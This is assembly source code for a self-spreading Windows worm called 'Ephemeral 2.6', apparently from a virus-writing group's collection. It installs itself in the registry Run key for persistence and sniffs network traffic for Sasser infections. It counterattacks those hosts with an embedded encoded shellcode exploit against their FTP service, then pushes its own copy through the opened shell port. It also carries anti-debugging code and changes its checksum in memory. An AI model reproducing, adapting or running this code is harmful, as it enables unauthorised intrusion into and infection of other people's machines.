comment *

modus operandi:
- sniff sasser attacks and exploit back
- attack sasser from a to f, and most recompiled variants
- crappy antidebug/disasm

advantages:
- only target potentially vulnerable machine.
- not noticable amount of traffic, and only when needed
- use random ports & random section name to change file checksum

compile with tasm 5.

Greets to all non-profit vxers, you are the real ones.
Real vxers don't need mass medias to know who they are.


					Tree Hugger

*

.586p
.model flat

callw   macro   x:REQ
        extrn   x:PROC
        call    x
endm

pushsz  macro string:REQ
	local __nxt
        call __nxt
        db string,0
__nxt:
endm

WSA_FLAG_OVERLAPPED	equ 1
IPPROTO_IP		equ 0
IPPROTO_RAW		equ 255
SOCK_RAW		equ 3
AF_INET			equ 2
SIO_RCVALL		equ 98000001h

KEY_SET_VALUE = 2h
KEY_CREATE_SUB_KEY = 4h
SYNCHRONIZE = 100000h
READ_CONTROL = 20000h
STANDARD_RIGHTS_WRITE = (READ_CONTROL)
KEY_WRITE = ((STANDARD_RIGHTS_WRITE Or KEY_SET_VALUE Or KEY_CREATE_SUB_KEY) And (Not SYNCHRONIZE))
HKLM	equ 80000002h
REG_SZ	equ 1

SEH equ 1
xpsploit equ 1

user	equ 'USER 2',10
pass	equ 'PASS 6',10

xorkey	equ 96h

.data
db 0

.code
sig	db '[Ephemeral 2.6] by TreeHugger, ',0,0
	db 'visit www.michaelmoore.com !',0
        ; other strings edited by 29A staff

Start:
	xor eax,eax
if SEH
	push esp
	mov fs:[eax],esp
endif

	push eax
	push eax
	push eax
	push offset realcode
	push eax
	push eax
	callw CreateThread
	jmp nodbg
	db 0fh

realcode:

if SEH
	push esp
	mov fs:[0],esp
endif
	cdq
	or dh,2
	sub esp,edx
	mov esi,esp

; -----------------------------------------------  registry installation -----
		push offset hkey
		push KEY_WRITE
		push 0
		push offset subkey
		push HKLM
		callw RegOpenKeyExA
		mov ebx,hkey

	push 512
	push esi
	push 0
	callw GetModuleFileNameA

		push eax
		push esi
		push REG_SZ
		push 0
		push offset sig
		push ebx
		callw RegSetValueExA

		push ebx
		callw RegCloseKey

; ---------------------------------  copy in ram and don't allow opening -----
	push 10h
	push esi
	callw _lopen
	mov ebx,eax
	inc eax
	jnz $+2+2
	mov eax,[eax]

	push 0
	push ebx
	callw GetFileSize
	mov cpsz,eax
	mov edi,eax

	push edi
	push 40h
	callw GlobalAlloc
	mov cpptr,eax

	push edi
	push eax
	push ebx
	callw _lread

	; screw img in ram -> diff md5
	callw GetTickCount
	mov edi,cpptr
	mov [edi+12ch],eax
	; change sploit shell port
	or ax,404h
	mov shp,ax
	xor ax,09696h
	mov word ptr [sploit+67h],ax

	push esi
	push 202h
	callw WSAStartup

; -----------------------------------------------  wait the right moment -----
__waitconn:
	push 0
	push 0
	callw InternetGetConnectedState
	or eax,eax
	jnz __conn_ok

	push 20*1000
	callw Sleep

	jmp __waitconn

__conn_ok:

; -------------------------------------------------------  start sniffer -----
	cdq
	push WSA_FLAG_OVERLAPPED
	push edx
	push edx
	push IPPROTO_IP
	push SOCK_RAW
	push AF_INET
	callw WSASocketA
	xchg eax,ebx

	push 512
	push esi
	callw gethostname
	push esi
	callw gethostbyname
	mov esi,eax
	lodsd
	lodsd
	lodsd
	lodsd
	mov esi,eax
	lodsd
	cmp dword ptr [esi],0
	jne $-4
	mov eax,[eax]

	mov edi,esp
	mov dword ptr [edi],2
	mov [edi+4],eax
	push 16
	push edi
	push ebx
	callw bind
	
	cdq
	push edx
	push edx
	push esp
	push edx
	push edx
	push 4
	call $+5+5
	dd 1
	db 0fh
	push SIO_RCVALL
	push ebx
	callw WSAIoctl

__nxt:
	push 0
	push 20h
	push edi
	push ebx
	callw recv

	cmp word ptr [edi+16h],0bd01h
	jne __nxt
	mov eax,[edi+12]
	cmp eax,lastip
	je __nxt
	mov lastip,eax

	xor edx,edx
	push edx
	push edx
	push eax
	push offset thread
	push edx
	push edx
	callw CreateThread
	push eax
	callw CloseHandle
	jmp __nxt

; ------------------------------------------------------------  sploitin -----
thread:
if SEH
	push esp
	mov dword ptr fs:[0],esp
	push dword ptr [esp+8]
else
	push dword ptr [esp+4]
endif
	push 0b2150002h
	mov edi,esp

	push 6
	push 1
	push 2
	callw socket
	xchg eax,ebx

	push 16
	push edi
	push ebx
	callw connect
	or eax,eax
	jz __k
	mov word ptr [esp+2],0ff03h
	push 16
	push edi
	push ebx
	callw connect
	or eax,eax
	jz __k
	mov eax,[eax]
__k:
	call __get

	push 0
	push 7
	pushsz user
	push ebx
	callw send

	call __get

	push 0
	push 7
	pushsz pass
	push ebx
	callw send

	call __get

	push 0
	push sploitsz
	push offset sploit
	push ebx
	callw send

	push 2000
	callw Sleep

	push ebx
	callw closesocket

	push 6
	push 1
	push 2
	callw socket
	xchg eax,ebx

	mov ax,shp
	mov word ptr [esp+2],ax

	push 16
	push edi
	push ebx
	callw connect
	or eax,eax
	jz $+2+2
	mov eax,[eax]

	push 0
	push cpsz
	push cpptr
	push ebx
	callw send

	push ebx
	callw closesocket

	ret

__get:
	push 0
	push 8
	push esp
	push ebx
	callw recv
	ret

; ---------------------------------------------------------------  sploit ----
sploit:
if xpsploit
comment *
; XP1 euro/asia
db 050h,04Fh,052h,054h,020h,0FFh,0EBh,011h,08Bh,034h,024h,033h,0C9h,066h,081h,0C1h
db 0A3h,001h,080h,036h,096h,046h,0E2h,0FAh,0C3h,0E8h,0EAh,0FFh,0FFh,0FFh,01Dh,07Ah
db 017h,07Ah,09Ah,084h,096h,096h,028h,046h,086h,028h,0E1h,01Bh,0EBh,06Eh,07Eh,091h
db 096h,096h,096h,0E1h,0E5h,0A4h,0C9h,0A5h,0A4h,096h,069h,080h,03Dh,07Eh,09Fh,096h
db 096h,096h,0FDh,0F3h,0E4h,0F8h,0F3h,0FAh,0A5h,0A4h,096h,069h,080h,03Dh,0FCh,090h
db 0FCh,097h,0FCh,094h,0FCh,081h,069h,0E3h,06Eh,069h,083h,05Ah,086h,028h,0E1h,069h
db 046h,005h,0FCh,096h,0FEh,094h,096h,02Ch,028h,01Dh,06Ah,0FCh,086h,0C1h,0C5h,0FCh
db 094h,069h,0E3h,06Eh,069h,083h,05Ah,086h,028h,0E1h,069h,046h,0CFh,0CFh,0C6h,0C5h
db 0FCh,09Bh,069h,0E3h,06Eh,069h,083h,05Ah,086h,028h,0E1h,069h,046h,0FCh,096h,0FCh
db 096h,0C5h,0FCh,097h,069h,0E3h,06Eh,069h,083h,05Ah,086h,028h,0E1h,069h,046h,005h
db 01Bh,023h,062h,06Bh,069h,069h,0C0h,0FEh,096h,094h,096h,096h,07Eh,09Bh,096h,096h
db 096h,0D1h,0F3h,0E2h,0C2h,0F3h,0FBh,0E6h,0C6h,0F7h,0E2h,0FEh,0D7h,096h,069h,0E3h
db 06Ah,069h,083h,05Ah,086h,028h,0E1h,069h,046h,0C0h,0FCh,096h,0FCh,096h,0C0h,07Eh
db 087h,096h,096h,096h,0D1h,0F3h,0E2h,0C2h,0F3h,0FBh,0E6h,0D0h,0FFh,0FAh,0F3h,0D8h
db 0F7h,0FBh,0F3h,0D7h,096h,069h,0E3h,06Ah,069h,083h,05Ah,086h,028h,0E1h,069h,046h
db 07Eh,093h,096h,096h,096h,0B8h,0F3h,0EEh,0F3h,096h,0C0h,07Eh,09Eh,096h,096h,096h
db 0FAh,0E5h,0E2h,0E4h,0F5h,0F7h,0E2h,096h,069h,0E3h,06Ah,07Dh,086h,011h,04Dh,006h
db 0EBh,006h,096h,096h,023h,0EBh,0BEh,077h,0E9h,0E7h,0FAh,0FFh,0FFh,069h,083h,05Ah
db 086h,028h,0E1h,069h,046h,0FCh,092h,0C0h,07Eh,09Eh,096h,096h,096h,0C9h,0FAh,0F5h
db 0E4h,0F3h,0F7h,0E2h,096h,069h,0E3h,06Ah,069h,083h,05Ah,086h,028h,0E1h,069h,046h
db 01Fh,0D3h,062h,01Bh,02Bh,062h,07Bh,069h,069h,0FCh,096h,0FEh,096h,086h,096h,096h
db 0C1h,0C5h,0FCh,086h,069h,0E3h,06Eh,069h,083h,05Ah,086h,028h,0E1h,069h,046h,0D6h
db 015h,06Eh,094h,0EAh,0B6h,0DEh,0C6h,0C1h,069h,0E3h,062h,07Eh,09Eh,096h,096h,096h
db 0C9h,0FAh,0E1h,0E4h,0FFh,0E2h,0F3h,096h,069h,0E3h,06Ah,069h,083h,05Ah,086h,028h
db 0E1h,069h,046h,07Dh,052h,069h,0E3h,062h,07Eh,09Eh,096h,096h,096h,0C9h,0FAh,0F5h
db 0FAh,0F9h,0E5h,0F3h,096h,069h,0E3h,06Ah,069h,083h,05Ah,086h,028h,0E1h,069h,046h
db 0FCh,096h,0C0h,07Eh,09Eh,096h,096h,096h,0C1h,0FFh,0F8h,0D3h,0EEh,0F3h,0F5h,096h
db 069h,0E3h,06Ah,069h,083h,05Ah,086h,028h,0E1h,069h,046h,0A5h,060h,0F2h,019h,090h
db 03Bh
*
; XP2 US..
DB 050h,04Fh,052h,054h,020h,0FFh,0EBh,011h,08Bh,034h,024h,033h,0C9h,066h,081h,0C1h
DB 0A3h,001h,080h,036h,096h,046h,0E2h,0FAh,0C3h,0E8h,0EAh,0FFh,0FFh,0FFh,01Dh,07Ah
DB 017h,07Ah,09Ah,084h,096h,096h,028h,046h,086h,057h,0E1h,01Bh,0EBh,06Eh,07Eh,091h
DB 096h,096h,096h,0E1h,0E5h,0A4h,0C9h,0A5h,0A4h,096h,069h,080h,03Dh,07Eh,09Fh,096h
DB 096h,096h,0FDh,0F3h,0E4h,0F8h,0F3h,0FAh,0A5h,0A4h,096h,069h,080h,03Dh,0FCh,090h
DB 0FCh,097h,0FCh,094h,0FCh,081h,069h,0E3h,06Eh,069h,083h,05Ah,086h,057h,0E1h,069h
DB 046h,005h,0FCh,096h,0FEh,094h,096h,02Ch,028h,01Dh,06Ah,0FCh,086h,0C1h,0C5h,0FCh
DB 094h,069h,0E3h,06Eh,069h,083h,05Ah,086h,057h,0E1h,069h,046h,0CFh,0CFh,0C6h,0C5h
DB 0FCh,09Bh,069h,0E3h,06Eh,069h,083h,05Ah,086h,057h,0E1h,069h,046h,0FCh,096h,0FCh
DB 096h,0C5h,0FCh,097h,069h,0E3h,06Eh,069h,083h,05Ah,086h,057h,0E1h,069h,046h,005h
DB 01Bh,023h,062h,06Bh,069h,069h,0C0h,0FEh,096h,094h,096h,096h,07Eh,09Bh,096h,096h
DB 096h,0D1h,0F3h,0E2h,0C2h,0F3h,0FBh,0E6h,0C6h,0F7h,0E2h,0FEh,0D7h,096h,069h,0E3h
DB 06Ah,069h,083h,05Ah,086h,057h,0E1h,069h,046h,0C0h,0FCh,096h,0FCh,096h,0C0h,07Eh
DB 087h,096h,096h,096h,0D1h,0F3h,0E2h,0C2h,0F3h,0FBh,0E6h,0D0h,0FFh,0FAh,0F3h,0D8h
DB 0F7h,0FBh,0F3h,0D7h,096h,069h,0E3h,06Ah,069h,083h,05Ah,086h,057h,0E1h,069h,046h
DB 07Eh,093h,096h,096h,096h,0B8h,0F3h,0EEh,0F3h,096h,0C0h,07Eh,09Eh,096h,096h,096h
DB 0FAh,0E5h,0E2h,0E4h,0F5h,0F7h,0E2h,096h,069h,0E3h,06Ah,07Dh,086h,011h,04Dh,006h
DB 0EBh,006h,096h,096h,0BDh,0C0h,0C1h,077h,0E9h,0E7h,0FAh,0FFh,0FFh,069h,083h,05Ah
DB 086h,057h,0E1h,069h,046h,0FCh,092h,0C0h,07Eh,09Eh,096h,096h,096h,0C9h,0FAh,0F5h
DB 0E4h,0F3h,0F7h,0E2h,096h,069h,0E3h,06Ah,069h,083h,05Ah,086h,057h,0E1h,069h,046h
DB 01Fh,0D3h,062h,01Bh,02Bh,062h,07Bh,069h,069h,0FCh,096h,0FEh,096h,086h,096h,096h
DB 0C1h,0C5h,0FCh,086h,069h,0E3h,06Eh,069h,083h,05Ah,086h,057h,0E1h,069h,046h,0D6h
DB 015h,06Eh,094h,0EAh,0B6h,0DEh,0C6h,0C1h,069h,0E3h,062h,07Eh,09Eh,096h,096h,096h
DB 0C9h,0FAh,0E1h,0E4h,0FFh,0E2h,0F3h,096h,069h,0E3h,06Ah,069h,083h,05Ah,086h,057h
DB 0E1h,069h,046h,07Dh,052h,069h,0E3h,062h,07Eh,09Eh,096h,096h,096h,0C9h,0FAh,0F5h
DB 0FAh,0F9h,0E5h,0F3h,096h,069h,0E3h,06Ah,069h,083h,05Ah,086h,057h,0E1h,069h,046h
DB 0FCh,096h,0C0h,07Eh,09Eh,096h,096h,096h,0C1h,0FFh,0F8h,0D3h,0EEh,0F3h,0F5h,096h
DB 069h,0E3h,06Ah,069h,083h,05Ah,086h,057h,0E1h,069h,046h,0A5h,060h,0F2h,019h,090h
DB 03Bh
else
endif
sploitsz equ $-sploit

; -----------------------------------------------------  stupid antidebug -----
nodbg:
	xchg eax,ebx
__bcl:
	push 1000
	callw Sleep
		push 0c32404ffh
		call esp
		db 0fh
		pop eax
	callw IsDebuggerPresent
	or eax,eax
	jnz __x

	lea edi,sig
	mov ecx,$-sig
	add al,0cch
	repnz scasb
	jecxz __bcl
__x:	push ecx
	push ebx
	callw TerminateThread
	push -2
	callw SuspendThread

; ----------------------------------------------------------------  vars -----
subkey	db 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',0
cpptr	dd ?
cpsz	dd ?
lastip	dd 0
hkey	dd ?
shp	dw ?	; shell port, random from now

end Start
